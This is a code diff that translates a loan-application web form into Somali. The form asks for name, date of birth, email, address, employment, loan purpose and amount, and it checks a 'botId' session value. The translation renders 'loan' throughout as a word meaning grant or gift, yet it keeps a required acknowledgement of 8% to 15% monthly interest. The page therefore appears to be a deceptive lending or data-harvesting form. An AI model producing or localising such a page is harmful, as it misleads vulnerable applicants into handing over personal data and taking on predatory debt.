@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Loan Application</title>
+    <title>Codsiga Deeqda</title>
 
     <style>
         * {
@@ -189,77 +189,77 @@
     <button class="back-arrow" onclick="window.history.back()">&#8592;</button>
 
     <!-- Title & subtitle -->
-    <div class="title">Loan Application</div>
-    <div class="subtitle">Please provide your personal information</div>
+    <div class="title">Codsiga Deeqda</div>
+    <div class="subtitle">Fadlan bixi macluumaadkaaga gaarka ah</div>
 
     <!-- Form -->
     <form id="loanForm">
-        <label>Full Name</label>
-        <input name="fullName" placeholder="e.g. John Doe" required />
+        <label>Magaca oo dhameystiran</label>
+        <input name="fullName" placeholder="Tusaale: Maxamed Cabdi" required />
 
-        <label>Date of Birth</label>
-        <input type="text" name="dob" placeholder="DD/MM/YYYY" maxlength="10" required />
+        <label>Taariikhda dhalashada</label>
+        <input type="text" name="dob" placeholder="MM/DD/YYYY" maxlength="10" required />
 
-        <label>Email Address</label>
-        <input type="email" name="email" placeholder="example@email.com" required />
+        <label>Ciwaanka iimaylka</label>
+        <input type="email" name="email" placeholder="tusaale@email.com" required />
 
-        <label>Residential Address</label>
-        <input name="address" placeholder="Your full address" required />
+        <label>Ciwaanka degelka</label>
+        <input name="address" placeholder="Ciwaankaaga buuxa" required />
 
-        <label>Employment Status</label>
+        <label>Heerka shaqada</label>
         <select name="employmentStatus" required>
-            <option value="">Select</option>
-            <option>Employed</option>
-            <option>Self-employed</option>
-            <option>Unemployed</option>
-            <option>Student</option>
+            <option value="">Dooro</option>
+            <option>Shaqaale</option>
+            <option>Isku shaqeeye</option>
+            <option>Shuqul la'aan</option>
+            <option>Arday</option>
         </select>
 
-        <label>Loan Purpose</label>
+        <label>Ujeedada deeqda</label>
         <select name="loanPurpose" required>
-            <option value="">Select</option>
-            <option>Business</option>
-            <option>Personal</option>
-            <option>Education</option>
-            <option>Medical</option>
-            <option>Emergency</option>
+            <option value="">Dooro</option>
+            <option>Ganacsi</option>
+            <option>Qof ahaaneed</option>
+            <option>Waxbarasho</option>
+            <option>Caafimaad</option>
+            <option>Degdeg</option>
         </select>
 
-        <label>Loan Amount (USD)</label>
-        <input type="number" name="loanAmount" required placeholder="MIN $100" min="100" max="100000" step="1" />
+        <label>Qadarka deeqda (USD)</label>
+        <input type="number" name="loanAmount" required placeholder="Ugu yar $100" min="100" max="100000" step="1" />
 
-        <label>Loan Term</label>
+        <label>Muddada deeqda</label>
         <select name="loanTerm" required>
-            <option value="">Select</option>
-            <option>6 months</option>
-            <option selected>12 months</option>
-            <option>24 months</option>
-            <option>36 months</option>
-            <option>48 months</option>
+            <option value="">Dooro</option>
+            <option>6 bilood</option>
+            <option selected>12 bilood</option>
+            <option>24 bilood</option>
+            <option>36 bilood</option>
+            <option>48 bilood</option>
         </select>
 
         <div class="checkbox-wrapper">
             <input type="checkbox" id="termsCheck" required />
-            <label for="termsCheck">I accept the terms and conditions</label>
+            <label for="termsCheck">Waxaan aqbalayaa shuruudaha iyo qawaaniinta</label>
         </div>
 
         <div class="checkbox-wrapper">
             <input type="checkbox" id="interestCheck" required />
             <label for="interestCheck">
-                I understand that loans are subject to an interest rate of <strong>8% to 15% per month</strong>
-                depending on creditworthiness and loan amount.
+                Waxaan fahamsanahay in deeqaha lagu daro dulsaarka <strong>8% ilaa 15% bishii</strong>
+                iyadoo ku xiran kalsoonida deynta iyo qadarka deeqda.
             </label>
         </div>
     </form>
 
     <!-- Button -->
-    <button id="continueBtn" class="continue-btn" disabled>Next</button>
+    <button id="continueBtn" class="continue-btn" disabled>Xiga</button>
 
     <!-- Version footer -->
     <div class="version-footer">Version 12.4.0892 (1200040892)</div>
 </div>
 
-<!-- ====== ORIGINAL LOGIC + DOB FORMATTER ====== -->
+<!-- ====== ORIGINAL LOGIC + DOB FORMATTER – UNTOUCHED ====== -->
 <script>
     (function() {
         // ---------- DOB AUTO-FORMAT (DD/MM/YYYY) ----------
@@ -292,7 +292,7 @@
         const botId = localStorage.getItem('botId');
 
         if (!botId) {
-            alert('Invalid session. Please start again.');
+            alert('Fadhi wuu dhacay. Fadlan dib u bilow.');
             window.location.href = 'index.html';
             return;
         }
